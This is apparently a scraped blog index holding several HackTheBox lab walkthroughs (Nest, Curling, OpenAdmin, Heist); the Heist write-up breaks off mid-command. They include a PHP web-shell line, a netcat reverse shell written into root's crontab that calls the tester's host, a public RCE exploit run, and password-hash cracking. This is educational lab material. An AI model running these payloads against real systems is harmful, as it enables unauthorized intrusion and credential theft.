xRxRxPANCAK3SxRxRx -R Users[+] IP: 10.10.10.178:445 Name: HTB-NEST Disk Permissions Comment ---- ----------- ------- Users READ ONLY .\\Users\\* dr--r--r-- 0 Sat Jan 25 23:04:21 2020 . dr--r--r-- 0 Sat Jan 25 23:04:21 2020 .. dr--r--r-- 0 Wed Jul 21 19:47:04 2021 Administrator dr--r--r-- 0 Wed Jul 21 19:47:04 2021 C.Smith dr--r--r-- 0 Thu Aug 8 18:03:29 2019 L.Frost dr--r--r-- 0 Thu Aug 8 18:02:56 2019 R.Thompson dr--r--r-- 0 Wed Jul 21 19:47:15 2021 TempUser .\\Users\\C.Smith\\* dr--r--r-- 0 Wed Jul 21 19:47:04 2021 . dr--r--r-- 0 Wed Jul 21 19:47:04 2021 .. dr--r--r-- 0 Wed Jul 21 19:47:05 2021 HQK Reporting fr--r--r-- 34 Mon Dec 26 10:59:43 2022 user.txt .\\Users\\C.Smith\\HQK Reporting\\* dr--r--r-- 0 Wed Jul 21 19:47:05 2021 . dr--r--r-- 0 Wed Jul 21 19:47:05 2021 .. dr--r--r-- 0 Fri Aug 9 13:18:42 2019 AD Integration Module fr--r--r-- 0 Wed Jul 21 19:47:12 2021 Debug Mode Password.txt fr--r--r-- 249 Wed Jul 21 19:47:14 2021 HQK_Config_Backup.xml .\\Users\\C.Smith\\HQK Reporting\\AD Integration Module\\* dr--r--r-- 0 Fri Aug 9 13:18:42 2019 . dr--r--r-- 0 Fri Aug 9 13:18:42 2019 .. fr--r--r-- 17408 Thu Aug 8 00:42:49 2019 HqkLdap.exeWe can see that there is a file with ADS:smb: \\C.Smith\\HQK Reporting\\&gt; allinfo \"Debug Mode Password.txt\"altname: DEBUGM~1.TXTcreate_time: Fri Aug 9 00:06:12 2019 BSTaccess_time: Fri Aug 9 00:06:12 2019 BSTwrite_time: Fri Aug 9 00:08:17 2019 BSTchange_time: Wed Jul 21 19:47:12 2021 BSTattributes: A (20)stream: [::$DATA], 0 bytesstream: [:Password:$DATA], 15 bytessmb: \\C.Smith\\HQK Reporting\\&gt; get \"Debug Mode Password.txt:Password\"And here we have it:$ cat Debug\\ Mode\\ Password.txt:Password WBQ201953D8wOne of the files is a XML with the following information:&lt;?xml version=\"1.0\"?&gt;&lt;ServiceSettings xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt; &lt;Port&gt;4386&lt;/Port&gt; &lt;QueryDirectory&gt;C:\\Program Files\\HQK\\ALL QUERIES&lt;/QueryDirectory&gt;&lt;/ServiceSettings&gt;We can see that we can do all type of queries there.$ telnet 10.10.10.178 4386Trying 10.10.10.178...Connected to 10.10.10.178.Escape character is '^]'.HQK Reporting Service V1.2&gt;helpThis service allows users to run queries against databases using the legacy HQK format--- AVAILABLE COMMANDS ---LISTSETDIR &lt;Directory_Name&gt;RUNQUERY &lt;Query_ID&gt;DEBUG &lt;Password&gt;HELP &lt;Command&gt;&gt;listUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[DIR] COMPARISONS[1] Invoices (Ordered By Customer)[2] Products Sold (Ordered By Customer)[3] Products Sold In Last 30 DaysCurrent Directory: ALL QUERIES&gt;We can now try to enable DEBUG with the previous password:&gt;debug WBQ201953D8w&gt;helpThis service allows users to run queries against databases using the legacy HQK format--- AVAILABLE COMMANDS ---LISTSETDIR &lt;Directory_Name&gt;RUNQUERY &lt;Query_ID&gt;DEBUG &lt;Password&gt;HELP &lt;Command&gt;SERVICESESSIONSHOWQUERY &lt;Query_ID&gt;&gt;showquery 2This will show a new password. We can use the previous decrypt to get the new password:$ mcs decrypt.cs$ ./decrypt.exePlaintext: XtH4nkS4Pl4y1nGXWe can try now to login with this credentials:$ psexec.py Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178C:\\Windows\\system32&gt; whoamint authority\\system" }, { "title": "HTB | Curling", "url": "/pentesting/htb/machines/curling", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-12-26 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA)| 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)|_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-generator: Joomla! - Open Source Content Management|_http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerationThe web is running a Joomla:http://10.10.10.150/ [200 OK] Apache[2.4.29], Bootstrap, Cookies[c0548020854924e0aecd05ed9f5b672b], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[c0548020854924e0aecd05ed9f5b672b], IP[10.10.10.150], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]We can fuzz the web:bin [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 48ms]modules [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 49ms]media [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 51ms]libraries [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 51ms]components [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 52ms]plugins [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1602ms]layouts [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 70ms]includes [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 3613ms]templates [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 3613ms]tmp [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 3617ms]language [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 4623ms]cache [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 4627ms]images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4636ms]administrator [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4637ms]server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 65ms] [Status: 200, Size: 14243, Words: 762, Lines: 362, Duration: 110ms]cli [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 45ms] [Status: 200, Size: 14243, Words: 762, Lines: 362, Duration: 109ms] [Status: 200, Size: 14243, Words: 762, Lines: 362, Duration: 115ms]index.php [Status: 200, Size: 14264, Words: 762, Lines: 362, Duration: 105ms].htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 48ms]. [Status: 200, Size: 14244, Words: 762, Lines: 362, Duration: 100ms].html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 51ms]configuration.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 50ms].php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms]README.txt [Status: 200, Size: 4872, Words: 481, Lines: 73, Duration: 48ms]LICENSE.txt [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 4154ms].htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 60ms]htaccess.txt [Status: 200, Size: 3005, Words: 438, Lines: 81, Duration: 67ms].htm [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms].htpasswds [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 45ms].htgroup [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 50ms]wp-forum.phps [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms].htaccess.bak [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms].htuser [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 54ms].ht [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms].htc [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms].htaccess.old [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms].htacess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 49ms]We can get the version of Joomla:$ curl -s http://10.10.10.150/README.txt | head -n 51- What is this? * This is a Joomla! installation/upgrade package to version 3.x * Joomla! Official site: https://www.joomla.org * Joomla! 3.8 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.8_version_history * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/stagingWe can get a accurate version with:$ curl -s http://10.10.10.150/administrator/manifests/files/joomla.xml | xmllint --format -&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;extension version=\"3.6\" type=\"file\" method=\"upgrade\"&gt; &lt;name&gt;files_joomla&lt;/name&gt; &lt;author&gt;Joomla! Project&lt;/author&gt; &lt;authorEmail&gt;admin@joomla.org&lt;/authorEmail&gt; &lt;authorUrl&gt;www.joomla.org&lt;/authorUrl&gt; &lt;copyright&gt;(C) 2005 - 2018 Open Source Matters. All rights reserved&lt;/copyright&gt; &lt;license&gt;GNU General Public License version 2 or later; see LICENSE.txt&lt;/license&gt; &lt;version&gt;3.8.8&lt;/version&gt; &lt;creationDate&gt;May 2018&lt;/creationDate&gt; &lt;description&gt;FILES_JOOMLA_XML_DESCRIPTION&lt;/description&gt; &lt;scriptfile&gt;administrator/components/com_admin/script.php&lt;/scriptfile&gt; &lt;update&gt;. . . &lt;SNIP&gt; . . .We can also use some automatic scanner for Joomla like JoomScan or JoomlaScan.$ perl joomscan.pl -u http://10.10.10.150/[+] FireWall Detector[++] Firewall not detected[+] Detecting Joomla Version[++] Joomla 3.8.8[+] Core Joomla Vulnerability[++] Target Joomla core is not vulnerable[+] Checking Directory Listing[++] directory has directory listing : http://10.10.10.150/administrator/componentshttp://10.10.10.150/administrator/moduleshttp://10.10.10.150/administrator/templateshttp://10.10.10.150/images/banners[+] Checking apache info/status files[++] Readable info/status files are not found [+] admin finder [++] Admin page : http://10.10.10.150/administrator/ [+] Checking robots.txt existing [++] robots.txt is not found [+] Finding common backup files name [++] Backup files are not found [+] Finding common log files name [++] error log is not found [+] Checking sensitive config.php.x file [++] Readable config files are not foundThis version doesn’t appear to be a vulnerable one. Also, we don’t have any webpage we could attack.Inspecting the source code we can find a secret.txt:$ $ curl http://10.10.10.150/secret.txt | base64 -dCurling2018!The pair of credentials Floris:Curling2018! will work.FootprintInitial AccessWith admin privileges we can go to Templates &gt; Templtates &gt; Protostar &gt; error.php. And add the line system($_GET['cmd']);. Now we have RCE:$ curl -s http://10.10.10.150/templates/protostar/error.php/error.php?cmd=iduid=33(www-data) gid=33(www-data) groups=33(www-data)Privilege EscalationWe can see only the user ****Floris**** under the /home directory. Under that directory we found some files but only one can be accesible.$ cat password_backup\t00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&amp;SY...H..\t00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4\t00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...`\t00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@......\t00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h..\t00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4\t00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J..\t00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..&lt;~.x\t00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .&gt;...sVT.zH....1\t00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s.\"\t000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R.\t000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p..\t000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C\t000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*..\t000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P.\t000000f0: 819b bb48 ...HWith Cyberchef we can easily decode it and see a password.txt file with a string: 5d&lt;wdCbdZu)|hChXll. Now we can SSH with the user.We found some services running:floris@curling:~$ nc -z -v 127.0.0.1 1-65535 2&gt;&amp;1 | grep -v 'Connection refused'Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!Connection to 127.0.0.1 80 port [tcp/http] succeeded!Connection to 127.0.0.1 3306 port [tcp/mysql] succeeded!Connection to 127.0.0.1 38602 port [tcp/*] succeeded!Connection to 127.0.0.1 38690 port [tcp/*] succeeded!Connection to 127.0.0.1 45110 port [tcp/*] succeeded!With pspy we can see they are doing cURL request to files in our home folder:2022/12/26 22:36:01 CMD: UID=0 PID=27843 | /bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input 2022/12/26 22:36:01 CMD: UID=0 PID=27846 | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportWe can make the root send a reverse shell. First, modify the crontab:$ cp /etc/crontab .$ $ echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 9000 &gt;/tmp/f ' &gt;&gt; crontab$ python3 -m http.server 80Start a netcat and change the file /home/floris/admin-area/input to:url = \"http://10.10.14.4/crontab\"output = \"/etc/crontab\"Wait a few seconds and we have our root reverse shell." }, { "title": "HTB | OpenAdmin", "url": "/pentesting/htb/machines/openadmin", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-12-25 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)| 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)|_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerationThe page has a default Apache. Fuzzing will show:music [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 44ms]artwork [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 43ms]server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 43ms] [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 49ms]sierra [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 43ms] [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 82ms] [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 44ms]But on each of the pages there are a different web.$ whatweb http://10.10.10.171/music/\thttp://10.10.10.171/music/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], JQuery[3.2.1], Script, Title[Music | NOT LIVE/NOT FOR PRODUCTION USE]$ whatweb http://10.10.10.171/artwork/\thttp://10.10.10.171/artwork/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], Email[hello@mydomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], JQuery[3.3.1], Script, Title[Arcwork &amp;mdash; Website Template by Colorlib]$ whatweb http://10.10.10.171/sierra/ \thttp://10.10.10.171/sierra/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], Email[contact@template.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], JQuery[3.2.1], Script, Title[Sierra], X-UA-Compatible[IE=edge]There aren’t much vulnerabilities for this jQuery version (searchsploit jquery). But for Apache:$ searchsploit apache 2.4.49. . . &lt;SNIP&gt; . . .Apache HTTP Server 2.4.49 - Path Traversal &amp; Remote Code Execution (RCE) | multiple/webapps/50383.shMusicWe can found different pages that display songs, playlist… but two of them pretty different. In one of them we have a contact form and the other have an OpenNetAdmin running. If we intercept the request we can see an ONA cookie:GET /music/contact.html? HTTP/1.1Host: 10.10.10.171User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateDNT: 1Connection: closeReferer: http://10.10.10.171/music/contact.htmlCookie: ONA_SESSION_ID=0la207702703doitfhb5d1rdb1Upgrade-Insecure-Requests: 1The ONA version can be seen in the page:Searching for it:$ searchsploit 18.1.1 --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------- ---------------------------------OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | php/webapps/47772.rbOpenNetAdmin 18.1.1 - Remote Code Execution | php/webapps/47691.sh--------------------------------------------------------------------------------------------------------------------------- ---------------------------------FootprintInitial AccessUsing that exploit grants us a direct webshell:$ bash 47691.sh http://10.10.10.171/ona/$ whoami\twww-dataUser EscalationThere are two users under /home:$ ls /homejimmyjoannaSearching in the system with the webshell we found the following:$ cat local/config/database_settings.inc.php&lt;?php$ona_contexts=array ( 'DEFAULT' =&gt; array ( 'databases' =&gt; array ( 0 =&gt; array ( 'db_type' =&gt; 'mysqli', 'db_host' =&gt; 'localhost', 'db_login' =&gt; 'ona_sys', 'db_passwd' =&gt; 'n1nj4W4rri0R!', 'db_database' =&gt; 'ona_default', 'db_debug' =&gt; false, ), ), 'description' =&gt; 'Default data context', 'context_color' =&gt; '#D3DBFF', ),);We can try this credentials for both users:$ ssh jimmy@10.10.10.171jimmy@openadmin:~$Finally, we have the credentials for jimmy:n1nj4W4rri0R!. This user doesn’t have sudo permission:jimmy@openadmin:~$ sudo -l[sudo] password for jimmy: Sorry, user jimmy may not run sudo on openadmin.We can see AppArmor running on the system:jimmy@openadmin:~$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/proc/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.accessWe can use the previous credentials to access the MySQL database:jimmy@openadmin:~$ mysql -u ona_sys -pEnter password:mysql&gt;We found there some credentials:mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || ona_default |+--------------------+2 rows in set (0.00 sec)mysql&gt; use ona_default;mysql&gt; show tables;+------------------------+| Tables_in_ona_default |+------------------------+| blocks || configuration_types |. . . &lt;SNIP&gt; . . . | users || vlan_campuses || vlans |+------------------------+40 rows in set (0.00 sec)mysql&gt; select * from users;+----+----------+----------------------------------+-------+---------------------+---------------------+| id | username | password | level | ctime | atime |+----+----------+----------------------------------+-------+---------------------+---------------------+| 1 | guest | 098f6bcd4621d373cade4e832627b4f6 | 0 | 2022-12-25 19:08:24 | 2022-12-25 19:08:24 || 2 | admin | 21232f297a57a5a743894a0e4a801fc3 | 0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |+----+----------+----------------------------------+-------+---------------------+---------------------+We can crack the hashes and get: guest:test and admin:admin. We can now login in ONA as admin.Jimmy can access a folder, /var/www/internal. There we have three files. In the index.php we can found the following hash:&lt;?php $msg = ''; if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { if ($_POST['username'] == 'jimmy' &amp;&amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') { $_SESSION['username'] = 'jimmy'; header(\"Location: /main.php\"); } else { $msg = 'Wrong username or password.'; } } ?&gt;Cracking this sha512 show the password Revealed. The main.php file show an RSA file:&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; # Open Admin Trusted# OpenAdmin$output = shell_exec('cat /home/joanna/.ssh/id_rsa');echo \"&lt;pre&gt;$output&lt;/pre&gt;\";?&gt;&lt;html&gt;&lt;h3&gt;Don't forget your \"ninja\" password&lt;/h3&gt;Click here to logout &lt;a href=\"logout.php\" tite = \"Logout\"&gt;Session&lt;/html&gt;This web cannot be accesed outside the machine. We can start an PHP server, but once we access the page with the credentials jimmy:Revealed it is blank:jimmy@openadmin:/var/www/internal$ php -S 10.10.10.171:10000In the log we can see the following line:[Sun Dec 25 19:19:26 2022] 10.10.14.4:45688 [200]: /[Sun Dec 25 19:19:26 2022] 10.10.14.4:45702 [404]: /css/bootstrap.min.css - No such file or directory[Sun Dec 25 19:19:33 2022] 10.10.14.4:42726 [302]: /index.phpcat: /home/joanna/.ssh/id_rsa: Permission deniedUser jimmy doesn’t have access to the user joanna. Checking for open ports we found this:jimmy@openadmin:/var/www/internal$ nc -z -v 127.0.0.1 1-65535 2&gt;&amp;1 | grep -v 'Connection refused'Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!Connection to 127.0.0.1 80 port [tcp/http] succeeded!Connection to 127.0.0.1 3306 port [tcp/mysql] succeeded!Connection to 127.0.0.1 9000 port [tcp/*] succeeded!Connection to 127.0.0.1 52846 port [tcp/*] succeeded!We can now bind that port to our machine:$ ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171And login in, now we can see the page:We try logging as joanna, but we need a passprhase:$ ssh -i id_rsa joanna@10.10.10.171 Enter passphrase for key 'id_rsa':Trying ninja doesn’t work, so we need to crack the RSA:$ ssh2john id_rsa &gt; hash$ john --wordlist=/usr/share/wordlists/rockyou.txt hash. . . &lt;SNIP&gt; . . . bloodninjas (id_rsa)And now we can access as joanna.Root EscalationWe can see we have access to nano:joanna@openadmin:~$ sudo -lMatching Defaults entries for joanna on openadmin: env_keep+=\"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\", env_keep+=\"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\", secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpassUser joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/privFollowing the GTFObins we have a quickly escalate:$ sudo /bin/nano /opt/priv. . . &lt;SNIP&gt; . . .# whoamiroot" }, { "title": "HTB | Heist", "url": "/pentesting/htb/machines/heist", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2022-12-25 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE| http-title: Support Login Page|_Requested resource was login.php|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds?5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049669/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsEnumerationHTTPA login can be seen under the port 80:Fuzzing the web show the following pages:images [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 54ms]css [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 54ms]js [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 58ms]Images [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 43ms]attachments [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 46ms]CSS [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 80ms]JS [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 61ms]Js [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 43ms]Css [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 44ms]IMAGES [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 44ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]Attachments [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 45ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]jS [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 45ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 62ms]We can login as Guest. There a conversation between a customer and an Admin can be seen. There it is talking about a Cisco router with the following configuration:version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input sshAs it can be seen in the doc of Cisco, username rout3r password 7 hidden_password.FootprintInitial AccessTrying to crack the Cisco hash report us:$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent Session..........: hashcatStatus...........: CrackedWe can crack the password 7 with some web. With that we get:0242114B0E143F015F5D1E161713 -&gt; $uperP@ssword02375012182C1A1D751618034F36415408 -&gt; Q4)sJu\\Y8qz*A3?dThe second doesn’t seem to be a real password, but we have something. The login page ask for a email in the user field, so the previous users can’t be use.Also, evil-winrm will not be useful:$ evil-winrm -i 10.10.10.149 -u rout3r -p stealth1agent$ evil-winrm -i 10.10.10.149 -u rout3r -p '$uperP@ssword'Some tries wouldn’t result:$ rpcclient -U rout3r 10.10.10.149 \tPassword for [WORKGROUP\\rout3r]:\tCannot connect to server. Error was NT_STATUS_LOGON_FAILURE$ smbclient -L \\\\\\\\10.10.10.149\\\\ -U rout3r\tPassword for [WORKGROUP\\rout3r]:\tsession setup failed: NT_STATUS_LOGON_FAILUREWith the stealth1agent password we can list the smb:$ smbclient -L \\\\\\\\10.10.10.149\\\\ -U Hazard Password for [WORKGROUP\\Hazard]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPCReconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.10.149 failed (Error NT_STATUS_IO_TIMEOUT)Unable to connect with SMB1 -- no workgroup availableWe can check the credentials are valid:$ crackmapexec smb 10.10.10.149 -u Hazard -p 'stealth1agent'SMB 10.10.10.149 445 SUPPORTDESK [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)SMB 10.10.10.149 445 SUPPORTDESK [+] SupportDesk\\Hazard:stealth1agentWe can try to bruteforcing the RID:$ crackmapexec smb 10.10.10.149 -u Hazard -p 'stealth1agent' --rid-bruteSMB 10.10.10.149 445 SUPPORTDESK [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)SMB 10.10.10.149 445 SUPPORTDESK [+] SupportDesk\\Hazard:stealth1agent SMB 10.10.10.149 445 SUPPORTDESK [+] Brute forcing RIDsSMB 10.10.10.149 445 SUPPORTDESK 500: SUPPORTDESK\\Administrator (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 501: SUPPORTDESK\\Guest (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 503: SUPPORTDESK\\DefaultAccount (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 513: SUPPORTDESK\\None (SidTypeGroup)SMB 10.10.10.149 445 SUPPORTDESK 1008: SUPPORTDESK\\Hazard (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 1009: SUPPORTDESK\\support (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 1012: SUPPORTDESK\\Chase (SidTypeUser)SMB 10.10.10.149 445 SUPPORTDESK 1013: SUPPORTDESK\\Jason (SidTypeUser)Now we have a list of users and a list of password to use. We can search for the WinRM protocol:$ crackmapexec winrm 10.10.10.149 -u users -p passWINRM 10.10.10.149 5985 NONE [-] None\\Chase:$uperP@sswordWINRM 10.10.10.149 5985 NONE [+] None\\Chase:Q4)sJu\\Y8qz*A3?d (Pwn3d!)WINRM 10.10.10.149 5985 NONE [-] None\\Chase:Q4)sJu\\Y8qz*A3?d \"'NoneType' object has no attribute 'upper'\"WINRM 10.10.10.149 5985 NONE [-] None\\Jason:stealth1agentConnect to the machine:$ evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\\Y8qz*A3?d'*Evil-WinRM* PS C:\\Users\\Chase\\Documents&gt;Privilege EscalationThe user Chase doesn’t have access to much system commands. We can check their privileges:*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledOnly the Administrator user is in the administrators group:*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; net localgroup administratorsAlias name administratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------AdministratorDumping lsass.exe won’t be possible:*Evil-WinRM* PS 